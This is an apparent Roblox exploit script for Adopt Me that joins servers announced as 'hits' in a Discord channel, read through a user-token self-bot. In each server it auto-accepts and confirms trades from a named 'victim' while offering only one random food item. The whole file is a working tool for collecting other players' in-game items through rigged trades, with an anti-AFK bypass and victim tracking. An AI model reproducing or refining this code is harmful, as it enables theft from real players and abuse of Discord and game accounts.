if not game:IsLoaded() then
	game.Loaded:Wait() -- Wait for game to load
end

if token == "" or channelId == "" then
    game.Players.LocalPlayer:kick("Add your token or channelId to use")
end

local bb = game:GetService("VirtualUser") -- Anti AFK
game:service "Players".LocalPlayer.Idled:connect(function()
    bb:CaptureController()
    bb:ClickButton2(Vector2.new())
end)

local HttpServ = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local victimFile = isfile("useradm.txt")
local joinedFile = isfile("joined_ids_adm.txt")
if not victimFile then
    writefile("useradm.txt", "victim username")
end
if not joinedFile then
    writefile("joined_ids_adm.txt", "[]") -- Initialize with empty JSON array
end
local victimUser = readfile("useradm.txt")
local joinedIds = HttpServ:JSONDecode(readfile("joined_ids_adm.txt"))
local didVictimLeave = false
local timer = 0

local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local loadingScreen = playerGui:WaitForChild("AssetLoadUI")
while loadingScreen.Enabled do
    wait(1) -- We wait while the loading screen is active
end
wait(10)
local waittime = delay or 0.1
wait(waittime) -- Small delay to make sure we are fully loaded

local tradeFrame = playerGui.TradeApp.Frame
local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
local inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")

TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
    if sender.Name == victimUser then
        TradeAcceptOrDeclineRequest:InvokeServer(sender, true)
    else
        TradeAcceptOrDeclineRequest:InvokeServer(sender, false)
    end
end)

game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')

local function saveJoinedId(messageId)
    table.insert(joinedIds, messageId) -- Add the new ID
    writefile("joined_ids_adm.txt", HttpServ:JSONEncode(joinedIds)) -- Save back to the file
end

local foodAdded = false

local function IsTrading()
    return tradeFrame.Visible
end

local function acceptTrade()
    while task.wait(0.1) do
        if IsTrading() then
            if not foodAdded then
                local foodKeys = {}
                for uid, data in pairs(inventory.food) do
                    table.insert(foodKeys, uid)
                end
                if #foodKeys > 0 then
                    local randomIndex = math.random(1, #foodKeys)
                    local randomFoodUid = foodKeys[randomIndex]
                    AddItemRemote:FireServer(randomFoodUid)
                    foodAdded = true
                end
            end
            AcceptNegotiationRemote:FireServer()
        end
    end
end

local function confirmTrade()
    while task.wait(0.1) do
        if IsTrading() and foodAdded then
            ConfirmTradeRemote:FireServer()
        end
    end
end

local function waitForPlayerLeave()
    local playerRemovedConnection
    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
        if removedPlayer.Name == victimUser then
            if playerRemovedConnection then
                playerRemovedConnection:Disconnect()
            end
            didVictimLeave = true
        end
    end)
end

local function tradeTimer()
    while task.wait(1) do
        if IsTrading() then
            timer = 0
        else
            timer = timer + 1
            foodAdded = false
        end
    end
end

waitForPlayerLeave()
task.spawn(acceptTrade) -- Start accepting trades
task.spawn(confirmTrade) -- Start confirming trades
task.spawn(tradeTimer)

local function autoJoin()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            ["Content-Type"] = "application/json"
        }
    })

    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        if #messages == 0 then
            print("0 messages found")
            return
        end
        for _, message in ipairs(messages) do
            if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
                if message.embeds[1].title:find("Join to get Adopt Me hit") then
                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
                    if placeId and jobId then
                        local victimUsername = message.embeds[1].fields[1].value

                        if didVictimLeave or timer > 10 then
                            if not table.find(joinedIds, tostring(message.id)) then
                                saveJoinedId(tostring(message.id)) -- Save this ID to the list
                                writefile("useradm.txt", victimUsername)
                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
                                return
                            end
                        end
                    end
                end
            end
        end
    else
        print("Response code is not 200. Is your token and channelid correct?")
    end
end

while wait(5) do
    autoJoin()
end
